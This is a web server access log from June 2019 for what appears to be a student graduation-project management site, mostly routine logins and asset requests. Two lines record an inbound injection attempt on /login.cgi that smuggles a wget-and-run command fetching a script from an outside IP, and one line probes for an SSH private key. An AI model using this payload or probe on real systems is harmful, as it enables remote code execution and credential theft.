46.34.178.215 - - [29/Jun/2019:00:20:39 +0800] "GET / HTTP/1.1" 200 11418
34.90.154.47 - - [29/Jun/2019:13:46:29 +0800] "-" 400 -
47.92.137.155 - - [29/Jun/2019:14:17:18 +0800] "GET /bysj/tosread HTTP/1.1" 404 3387
47.98.96.116 - - [29/Jun/2019:14:35:43 +0800] "GET /bysj/tosg HTTP/1.1" 404 3387
117.193.109.58 - - [29/Jun/2019:15:00:20 +0800] "GET / HTTP/1.1" 200 11418
39.107.86.51 - - [29/Jun/2019:15:02:40 +0800] "GET /bysj/totopicresult HTTP/1.1" 404 3387
47.92.98.215 - - [29/Jun/2019:15:08:21 +0800] "GET /bysj/totopic HTTP/1.1" 404 3387
94.67.116.114 - - [29/Jun/2019:15:12:52 +0800] "GET /login.cgi?cli=aa%20aa%27;wget%20http://104.248.93.159/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 -
94.67.116.114 - - [29/Jun/2019:15:12:55 +0800] "GET /login.cgi?cli=aa%20aa%27;wget%20http://104.248.93.159/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 -
113.200.219.2 - - [29/Jun/2019:15:24:27 +0800] "GET /svn HTTP/1.1" 404 957
113.200.219.2 - - [29/Jun/2019:15:24:27 +0800] "GET /favicon.ico HTTP/1.1" 200 4286
177.188.62.40 - - [29/Jun/2019:15:37:06 +0800] "GET / HTTP/1.1" 200 11418
125.236.212.240 - - [29/Jun/2019:15:37:11 +0800] "GET / HTTP/1.1" 200 11418
103.89.254.204 - - [29/Jun/2019:16:04:10 +0800] "GET / HTTP/1.1" 200 11418
31.40.123.80 - - [29/Jun/2019:17:59:24 +0800] "GET / HTTP/1.1" 200 11418
149.34.32.64 - - [29/Jun/2019:18:20:20 +0800] "GET / HTTP/1.1" 200 11418
62.75.230.143 - - [29/Jun/2019:19:28:27 +0800] "HEAD /.ssh/id_dsa HTTP/1.0" 404 -
5.22.154.11 - - [29/Jun/2019:20:12:00 +0800] "GET / HTTP/1.1" 200 11418
80.82.70.187 - - [29/Jun/2019:23:14:08 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
219.145.104.203 - - [29/Jun/2019:23:58:32 +0800] "GET /bysj HTTP/1.1" 302 -
219.145.104.203 - - [29/Jun/2019:23:58:32 +0800] "GET /bysj/ HTTP/1.1" 302 -
219.145.104.203 - - [29/Jun/2019:23:58:32 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2151
219.145.104.203 - - [29/Jun/2019:23:58:32 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
61.185.28.125 - - [29/Jun/2019:23:58:32 +0800] "GET /bysj/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
61.185.28.125 - - [29/Jun/2019:23:58:32 +0800] "GET /bysj/js/login.js HTTP/1.1" 200 777
61.185.28.125 - - [29/Jun/2019:23:58:33 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66964
61.185.28.125 - - [29/Jun/2019:23:58:34 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
61.185.28.125 - - [29/Jun/2019:23:58:36 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
61.185.28.125 - - [29/Jun/2019:23:58:36 +0800] "GET /bysj/images/logo4.png HTTP/1.1" 200 8674
61.185.28.125 - - [29/Jun/2019:23:58:36 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
61.185.28.125 - - [29/Jun/2019:23:58:36 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
183.184.58.195 - - [29/Jun/2019:23:58:42 +0800] "GET /bysj HTTP/1.1" 302 -
183.184.58.195 - - [29/Jun/2019:23:58:42 +0800] "GET /bysj/ HTTP/1.1" 302 -
183.184.58.195 - - [29/Jun/2019:23:58:42 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2151
183.184.58.195 - - [29/Jun/2019:23:58:42 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
183.184.58.195 - - [29/Jun/2019:23:58:42 +0800] "GET /bysj/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
183.184.58.195 - - [29/Jun/2019:23:58:42 +0800] "GET /bysj/js/login.js HTTP/1.1" 200 777
183.184.58.195 - - [29/Jun/2019:23:58:42 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66964
183.184.58.195 - - [29/Jun/2019:23:58:43 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
183.184.58.195 - - [29/Jun/2019:23:58:46 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
183.184.58.195 - - [29/Jun/2019:23:58:46 +0800] "GET /bysj/images/logo4.png HTTP/1.1" 200 8674
183.184.58.195 - - [29/Jun/2019:23:58:46 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
183.184.58.195 - - [29/Jun/2019:23:58:46 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
183.184.58.195 - - [29/Jun/2019:23:58:46 +0800] "GET /favicon.ico HTTP/1.1" 200 4286
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "POST /bysj/login HTTP/1.1" 200 3509
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/js/title.js HTTP/1.1" 200 1998
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/css/Main.css HTTP/1.1" 200 583
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/images/nav1.jpg HTTP/1.1" 200 35839
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/layout_arrows.png HTTP/1.1" 200 319
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
183.184.58.195 - - [29/Jun/2019:23:58:48 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tree_icons.png HTTP/1.1" 200 3115
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "POST /bysj/login HTTP/1.1" 200 3509
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/css/Main.css HTTP/1.1" 200 583
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/js/title.js HTTP/1.1" 200 1998
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/layout_arrows.png HTTP/1.1" 200 319
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
219.145.104.203 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/images/nav1.jpg HTTP/1.1" 200 35839
61.185.28.125 - - [29/Jun/2019:23:58:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tree_icons.png HTTP/1.1" 200 3115
183.184.58.195 - - [29/Jun/2019:23:58:54 +0800] "GET /bysj/userInfo HTTP/1.1" 200 1716
183.184.58.195 - - [29/Jun/2019:23:58:55 +0800] "GET /bysj/userInfoEditPage HTTP/1.1" 200 2899
183.184.58.195 - - [29/Jun/2019:23:58:55 +0800] "GET /bysj/js/student/stuInfoEdit.js HTTP/1.1" 200 584
183.184.58.195 - - [29/Jun/2019:23:58:56 +0800] "GET /bysj/userPasswordEditPage HTTP/1.1" 200 2313
183.184.58.195 - - [29/Jun/2019:23:58:56 +0800] "GET /bysj/js/editPassword.js HTTP/1.1" 200 334
183.184.58.195 - - [29/Jun/2019:23:58:58 +0800] "GET /bysj/toGroupInfo HTTP/1.1" 200 1303
183.184.58.195 - - [29/Jun/2019:23:58:58 +0800] "GET /bysj/js/student/sGroupInfo.js HTTP/1.1" 200 2009
183.184.58.195 - - [29/Jun/2019:23:58:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
183.184.58.195 - - [29/Jun/2019:23:58:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
183.184.58.195 - - [29/Jun/2019:23:58:58 +0800] "POST /bysj/Stu/querySGroupInfo HTTP/1.1" 200 1276
183.184.58.195 - - [29/Jun/2019:23:58:58 +0800] "POST /bysj/Stu/queryTInfo HTTP/1.1" 200 416
183.184.58.195 - - [29/Jun/2019:23:58:59 +0800] "GET /bysj/toProcess HTTP/1.1" 200 1558
183.184.58.195 - - [29/Jun/2019:23:58:59 +0800] "GET /bysj/js/normalProcess.js HTTP/1.1" 200 1730
183.184.58.195 - - [29/Jun/2019:23:58:59 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/search.png HTTP/1.1" 200 813
183.184.58.195 - - [29/Jun/2019:23:58:59 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 2929
183.184.58.195 - - [29/Jun/2019:23:59:01 +0800] "GET /bysj/toTopic HTTP/1.1" 200 4092
183.184.58.195 - - [29/Jun/2019:23:59:01 +0800] "GET /bysj/js/student/topic.js HTTP/1.1" 200 5131
183.184.58.195 - - [29/Jun/2019:23:59:01 +0800] "GET /bysj/js/student/topicSApply.js HTTP/1.1" 200 1556
183.184.58.195 - - [29/Jun/2019:23:59:01 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/edit_add.png HTTP/1.1" 200 1088
183.184.58.195 - - [29/Jun/2019:23:59:01 +0800] "POST /bysj/Stu/queryDTopic HTTP/1.1" 200 2329
183.184.58.195 - - [29/Jun/2019:23:59:02 +0800] "GET /bysj/toTopicResult HTTP/1.1" 200 1211
183.184.58.195 - - [29/Jun/2019:23:59:02 +0800] "GET /bysj/js/student/topicResult.js HTTP/1.1" 200 5159
183.184.58.195 - - [29/Jun/2019:23:59:02 +0800] "POST /bysj/Stu/queryTopicResult HTTP/1.1" 200 511
183.184.58.195 - - [29/Jun/2019:23:59:06 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1182
183.184.58.195 - - [29/Jun/2019:23:59:06 +0800] "GET /bysj/js/student/sRead.js HTTP/1.1" 200 4154
183.184.58.195 - - [29/Jun/2019:23:59:06 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
183.184.58.195 - - [29/Jun/2019:23:59:07 +0800] "GET /bysj/toUpload HTTP/1.1" 200 3013
183.184.58.195 - - [29/Jun/2019:23:59:07 +0800] "GET /bysj/js/student/sUpload.js HTTP/1.1" 200 1206
183.184.58.195 - - [29/Jun/2019:23:59:07 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
183.184.58.195 - - [29/Jun/2019:23:59:10 +0800] "GET /bysj/toSG HTTP/1.1" 200 3217
183.184.58.195 - - [29/Jun/2019:23:59:10 +0800] "GET /bysj/js/student/sG.js HTTP/1.1" 200 2899
183.184.58.195 - - [29/Jun/2019:23:59:10 +0800] "POST /bysj/Stu/querySG HTTP/1.1" 200 471
183.184.58.195 - - [29/Jun/2019:23:59:10 +0800] "GET /bysj/toScore HTTP/1.1" 200 1183
183.184.58.195 - - [29/Jun/2019:23:59:10 +0800] "GET /bysj/js/student/sScore.js HTTP/1.1" 200 1863
183.184.58.195 - - [29/Jun/2019:23:59:11 +0800] "POST /bysj/Stu/querySScore HTTP/1.1" 200 552
183.184.58.195 - - [29/Jun/2019:23:59:11 +0800] "GET /bysj/toSpeechGroup HTTP/1.1" 200 1201
183.184.58.195 - - [29/Jun/2019:23:59:11 +0800] "GET /bysj/js/student/sSpeechGroup.js HTTP/1.1" 200 927
183.184.58.195 - - [29/Jun/2019:23:59:11 +0800] "POST /bysj/Stu/querySSpeechGroup HTTP/1.1" 200 226
